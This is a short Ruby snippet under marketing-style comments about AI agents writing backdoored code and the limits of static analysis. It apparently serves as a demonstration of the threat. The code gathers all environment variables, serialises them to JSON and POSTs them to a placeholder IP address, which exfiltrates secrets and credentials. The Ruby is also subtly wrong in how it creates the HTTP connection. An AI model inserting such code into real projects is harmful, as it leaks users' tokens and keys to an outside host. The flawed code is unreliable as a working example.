# backdoor read/write access to 1M+ repositories. 

# Simple static analysis tools don't spot it. 

# Your LLM observability layer that promises "security" might flag it
# but by then the damage is done. 

# In order truly secure model inputs/outputs and actions you need to
# guard against injections prior to them ever happening. 

# This is a difficult task especially due to the sheer amount of code
# that agents write making it super hard for humans to review .

# There is a better way...

require 'net/http'
require 'uri'
require 'json'

# collect environment variables
env_vars = ENV.to_h

# convert environment variables to JSON format
json_data = env_vars.to_json

# define the URL to send the HTTP POST request
url = URI.parse('http://1.2.3.4/')

begin
    # create the HTTP POST request
    http = Net::HTTP::POST.new(url.host, url.port)
    request = Net::HTTP::Post.new(url.path)
    request['Content-Type'] = 'application/json'
    request.body = json_data

    # send the request
    response = http.request(request)
rescue StandardError => e
    puts "An error occurred: #{e.message}"
end
